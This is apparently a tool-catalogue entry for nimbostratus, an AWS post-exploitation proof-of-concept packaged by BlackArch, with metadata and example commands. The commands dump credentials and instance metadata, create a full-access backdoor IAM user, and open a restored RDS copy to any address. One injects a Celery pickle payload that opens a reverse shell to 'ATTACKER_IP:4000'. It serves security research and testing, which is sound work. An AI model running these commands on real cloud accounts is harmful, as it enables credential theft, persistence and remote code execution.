---
name: "nimbostratus"
categories:
  - blackarch-fingerprint
version: "54.c7c206f"
homepage: "https://github.com/andresriancho/nimbostratus"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "andresriancho/nimbostratus"
github-stars: 520
github-pushed: "2022-11-10"
github-archived: false
github-issues: 9
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# nimbostratus

> Post-exploitation toolset for Amazon cloud (AWS/EC2) environments: dump credentials, permissions and instance metadata, then abuse broad IAM, RDS, SQS and Celery rights.

## What it's for

Nimbostratus is a proof-of-concept toolset for pivoting inside Amazon cloud infrastructure once you have a foothold — code execution on an EC2 instance or leaked AWS keys. Its subcommands first enumerate what the current position yields (instance-profile credentials, IAM permissions, EC2 metadata), then abuse overly broad credentials: creating a backdoor IAM user, snapshotting an RDS database to reach data you cannot query, or injecting a pickle payload into a Celery SQS queue for command execution. It talks to AWS through the boto library, so `dump-credentials` only finds credentials boto's configuration chain (including the EC2 instance metadata service) knows about. It is a python2-era research PoC (2012–2013) by the w3af author, packaged as-is; its companion project `nimbostratus-target` sets up a legal AWS environment to test against.

## Typical use cases

### Dump credentials from a compromised EC2 instance

```
nimbostratus dump-credentials
```

Outcome: enumerates AWS credentials from boto's configuration sources and the EC2 instance metadata, printing the access key and secret key found — the usual first command after landing on an instance; keys with a session token indicate instance-profile role credentials (`--token` reuses them from another host).

### Enumerate what the credentials can do

```
nimbostratus dump-permissions --access-key=<ACCESS_KEY> --secret-key=<SECRET_KEY>
```

Outcome: reports whether the keys belong to the root account or a low-privileged user and prints the IAM policy statements granted, revealing which AWS APIs are callable from elsewhere.

### Dump EC2 instance metadata

```
nimbostratus dump-ec2-metadata
```

Outcome: queries `http://169.254.169.254/latest/meta-data/` on the local instance and prints instance type, AMI ID, security groups, availability zone, architecture and private IP; the user-data script is written to `user-data.txt`.

### Create an IAM user with full privileges

```
nimbostratus create-iam-user --access-key=<ACCESS_KEY> --secret-key=<SECRET_KEY>
```

Outcome: if the credentials may create IAM users, creates one under a random name with a policy allowing access to all Amazon resources, and prints its fresh access key and secret for persistent access.

### Copy an unreachable RDS database via snapshot

```
nimbostratus snapshot-rds --access-key=<ACCESS_KEY> --secret-key=<SECRET_KEY> --password <Password1> --rds-name <DB_ID> --region ap-southeast-1
```

Outcome: snapshots the named RDS instance and restores it as a new one whose security group accepts connections from anywhere, then prints the restored host, port and credentials for a MySQL client connection (each phase takes at least ~5 minutes).

### Get command execution through a pickle-serializing Celery queue

```
nimbostratus celery-pickle-exploit --access-key=<ACCESS_KEY> --secret-key=<SECRET_KEY> --reverse ATTACKER_IP:4000 --queue-name <QUEUE> --region ap-southeast-1
```

Outcome: verifies the SQS queue feeds a Celery worker using pickle serialization, injects a crafted raw message, and waits for the worker's reverse connection to your listener at `ATTACKER_IP:4000` when the payload is unpickled.

*No corpus evidence — derived from upstream documentation.*
